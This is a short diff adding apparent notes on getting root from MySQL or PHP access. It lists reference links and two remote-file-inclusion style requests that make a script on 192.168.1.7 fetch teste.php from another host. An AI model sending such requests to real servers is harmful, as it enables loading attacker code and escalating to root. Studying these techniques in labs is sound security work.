@@ -1,0 +1,5 @@
+https://www.youtube.com/watch?v=Qe7NyNdBUpY
+https://recipeforroot.com/mysql-to-system-root/
+https://stackoverflow.com/questions/8532304/execute-root-commands-via-php
+192.168.1.7/download.php?src=http://192.168.1.6/teste.php
+teste.php?src=http://192.168.1.6/teste.php
